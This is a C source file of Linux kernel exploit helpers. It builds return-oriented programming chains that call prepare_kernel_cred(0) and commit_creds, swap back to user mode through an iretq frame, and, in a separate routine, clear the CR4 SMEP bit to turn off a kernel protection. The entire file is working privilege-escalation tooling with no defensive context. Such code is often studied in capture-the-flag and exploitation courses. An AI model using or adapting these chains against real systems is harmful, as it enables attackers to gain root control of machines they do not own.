#include <iterator>
#include <stddef.h>
#include <stdint.h>
#include "rop.h"

/* ============= ROP Helpers ==============*/

/* Copy |src_len| qwords from |src| into |dst| starting at |*off|,
 * then advance *off and return the new offset.                 */
size_t append_chain(uintptr_t *dst,
                    size_t *off,
                    const uintptr_t *src,
                    size_t src_len)
{
    for (size_t j = 0; j < src_len; ++j)
        dst[*off + j] = src[j]; // qword-by-qword copy
    *off += src_len;
    return *off;
}


/* ============= Kcreds Commit ============= */

/* ROP: prepare_kernel_cred -> commit_creds -> swapgs -> iretq */
size_t chain_kcred_iretq(uintptr_t *rop,
                       	uintptr_t pop_rdi_ret,
                       	uintptr_t prepare_kernel_cred,
                       	const uintptr_t *mov_rax_to_rdi_chain,
                       	uintptr_t commit_creds,
                       	uintptr_t swapgs_pop_rbp_ret,
                       	uintptr_t iretq,
                       	iretq_user_ctx_t ctx)
{
    size_t i = 0;

    // Step 1: prepare_kernel_cred(0)
    rop[i++] = pop_rdi_ret;
    rop[i++] = 0x0;
    rop[i++] = prepare_kernel_cred;

    // Step 2: rdi ⟵ returned rax (chain assumed to include dummies)
    for (size_t j = 0; mov_rax_to_rdi_chain[j]; ++j) {
        rop[i++] = mov_rax_to_rdi_chain[j];
    }

    // Step 3: commit_creds(rdi)
    rop[i++] = commit_creds;

    // Step 4: swapgs; pop rbp; ret
    rop[i++] = swapgs_pop_rbp_ret;
    rop[i++] = 0x0; 

    // Step 5: iretq frame
    rop[i++] = iretq;
    rop[i++] = ctx.rip;
    rop[i++] = ctx.cs;
    rop[i++] = ctx.rflags;
    rop[i++] = ctx.rsp;
    rop[i++] = ctx.ss;

    return i;
}


/* ============= CR4 =============
 * (depreciated since Linux 5.1)
 * */

/* CR4 SMEP off: zero 20th bit */
size_t chain_cr4_smep(uintptr_t *rop, 
                    uintptr_t pop_rdi_ret,
                    uintptr_t cr4_val,
                    uintptr_t mov_cr4_rdi_ret,
                    uintptr_t ret_addr)
{
    int i = 0;

    // Mask out bit 20 (SMEP disable)
    cr4_val &= ~(1ul << 20);  

    rop[i++] = pop_rdi_ret;
    rop[i++] = cr4_val;           
    rop[i++] = mov_cr4_rdi_ret;
    rop[i++] = ret_addr;          // Return to userland

    return i;
}

